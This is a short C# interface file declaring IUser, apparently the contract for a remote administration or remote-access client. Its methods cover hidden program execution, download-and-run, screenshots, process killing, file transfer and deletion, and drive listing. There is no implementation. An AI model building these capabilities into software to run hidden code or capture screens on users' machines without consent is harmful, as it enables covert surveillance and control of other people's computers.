﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;

namespace Interfaces.Users
{
    public interface IUser
    {
        void SetCompName(string newName);
        void UploadDirectory(string dirPath, string uploadPath);
        List<string> GetLog();
        IInfoDevice GetInfoDevice();
        /// <summary>
        /// Устарело, используйте DownloadF(string FileName, string localPath)
        /// </summary>
        void DownloadFloader(string ftpPath, string localPath);
        void DownloadF(string FileName, string localPath);
        void DownloadUpdate();
        void Reconnect();
        void Disconnect();
        void RunM(string file, string args);
        void RunHideProgram(string file);
        void DownloadAndRun(string file);
        void DeleteFile(string file);
        ISetting GetSetting();
        Bitmap ScreenShot();
        List<string> GetListProc();
        void KillProcess(string procName);
        string GetKey();
        IDirectoryInfo GetDirectoryFiles(string path, string searchPattern);
        List<string> GetDrives();
    }
}
